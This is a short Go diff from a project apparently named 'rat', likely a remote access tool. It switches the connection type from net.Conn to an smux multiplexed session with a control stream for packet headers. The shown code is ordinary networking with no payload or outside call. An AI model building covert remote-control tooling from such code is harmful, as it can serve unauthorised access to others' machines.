@@ -4,14 +4,16 @@ import (
 	"encoding/binary"
 	"io"
 	"log"
-	"net"
 	"rat/shared"
 	"rat/shared/network"
 	"rat/shared/network/header"
+
+	"github.com/xtaci/smux"
 )
 
 type Connection struct {
-	net.Conn
+	Conn    *smux.Session
+	control *smux.Stream
 	network.Writer
 	network.Reader
 }
@@ -30,13 +32,13 @@ func (c *Connection) Close() {
 
 func (c *Connection) ReadHeader() (header.PacketHeader, error) {
 	var h header.PacketHeader
-	err := binary.Read(c, shared.ByteOrder, &h)
+	err := binary.Read(c.control, shared.ByteOrder, &h)
 
 	return h, err
 }
 
 func (c *Connection) WriteHeader(header header.PacketHeader) error {
-	return binary.Write(c.Conn, shared.ByteOrder, header)
+	return binary.Write(c.control, shared.ByteOrder, header)
 }
 
 func (c *Connection) WritePacket(packet OutgoingPacket) error {
